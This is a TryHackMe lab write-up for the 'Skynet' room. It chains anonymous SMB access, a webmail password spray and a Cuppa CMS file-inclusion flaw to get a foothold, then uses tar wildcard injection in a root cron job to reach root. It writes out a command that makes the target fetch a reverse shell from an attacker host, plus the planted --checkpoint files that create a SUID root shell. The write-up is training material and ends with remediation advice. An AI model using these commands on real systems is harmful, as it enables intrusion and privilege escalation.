# Skynet — TryHackMe Writeup

> **Room:** [Skynet](https://tryhackme.com/room/skynet) · **Difficulty:** Easy
> **Category:** Web / Linux (SMB → RFI → tar wildcard)
> **Author of writeup:** 0xnyx
> **Goal:** Enumerate SMB and webmail to get a foothold on a Cuppa CMS install, then abuse a root cron job to get root.

> ⚠️ In line with TryHackMe's [write-up policy](https://tryhackme.com/room/skynet), **no flags are included** — only the method.

---

## How to read this writeup

Each step: **Do** → **You get** → **Why / what next**.

---

## Step 1 — Port & share enumeration

**Do** — Full service scan.

```bash
nmap -sVC -T4 -Pn <TARGET>
```

**You get**

```
22  ssh
80  http   Apache (Miles Dyson's personal page)
110 pop3
139/445 smb (Samba)
143 imap
```

**Why / what next** — SMB + a mail stack (POP3/IMAP) + a personal web page. SMB first — it's the quickest win when anonymous access is allowed.

**Do** — List and read the anonymous shares.

```bash
smbclient -L //<TARGET>/ -N
smbclient //<TARGET>/anonymous -N
```

**You get** — An `anonymous` share holding a `logs/` folder with a `log1.txt` that is a **list of passwords**, plus references to the user **milesdyson**.

**Why / what next** — A password wordlist tied to a named user is a credential-spray list. We need a service that accepts those creds.

---

## Step 2 — Webmail → SMB creds

**Do** — Content-discover the web root; the personal page is a decoy.

```bash
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt
```

**You get** — A `/squirrelmail` login (webmail).

**Why / what next** — Spray the `log1.txt` passwords against SquirrelMail as `milesdyson`. One works → inbox contains an email with milesdyson's **Samba password**.

**Do** — Use that password to open milesdyson's private SMB share.

```bash
smbclient //<TARGET>/milesdyson -U milesdyson
```

**You get** — Inside, an `important.txt` note revealing a **hidden web directory**: `/45kra24zxs28v3yd`.

**Why / what next** — A non-guessable hidden path is the real web surface. Browse it.

---

## Step 3 — Foothold (Cuppa CMS RFI)

**Do** — Content-discover inside the hidden directory.

```bash
gobuster dir -u http://<TARGET>/45kra24zxs28v3yd -w /usr/share/wordlists/dirb/common.txt
```

**You get** — `/administrator` → **Cuppa CMS**.

**Why / what next** — Cuppa CMS has a well-known **Remote/Local File Inclusion** in `alertConfigField.php` via the `urlConfig` parameter — no auth needed. Host a PHP reverse shell on your box and include it:

```bash
# attacker: python3 -m http.server 8000  (serving shell.php) + nc -lvnp 4444
curl "http://<TARGET>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<ATTACKER>:8000/shell.php"
```

**You get** — A reverse shell as **www-data**; the user flag is in milesdyson's home.

**Why / what next** — Now enumerate for a privesc path.

---

## Step 4 — Root (tar wildcard injection)

**Do** — Look for scheduled jobs running as root.

```bash
cat /etc/crontab
```

**You get**

```
*/1 * * * * root /home/milesdyson/backups/backup.sh
```

```bash
cat /home/milesdyson/backups/backup.sh
# tar czf /home/milesdyson/backups/backup.tgz *
```

**Why / what next** — The script runs `tar * ` **as root** from a directory we can write to. `tar` treats filenames beginning with `--` as options, so we plant files named after tar's `--checkpoint` hooks to run a command as root ([GTFOBins: tar](https://gtfobins.github.io/gtfobins/tar/)):

```bash
cd /home/milesdyson/backups
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
# wait for the cron tick, then:
/tmp/rootbash -p
```

**You get** — A SUID root shell → root flag.

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Anonymous SMB | Password list + user `milesdyson` |
| 2 | SquirrelMail cred spray | milesdyson SMB password → hidden web dir |
| 3 | Cuppa CMS RFI (`urlConfig`) | www-data reverse shell (user flag) |
| 4 | tar wildcard in root cron | Root |

## Lessons

- Anonymous SMB shares leak credential material constantly — always `smbclient -L ... -N` first.
- Chain creds across services: a password list from SMB → webmail → a different SMB share.
- **tar wildcard injection** is the classic win when a root cron runs `tar *` in a writable dir — plant `--checkpoint`/`--checkpoint-action` files.

## Remediation

- Disable anonymous SMB; segregate shares.
- Patch/replace Cuppa CMS (the RFI is unauthenticated).
- Never use shell globs (`*`) in privileged scripts — use absolute paths and `--` to end options.

---

*Write-up for [TryHackMe — Skynet](https://tryhackme.com/room/skynet).*
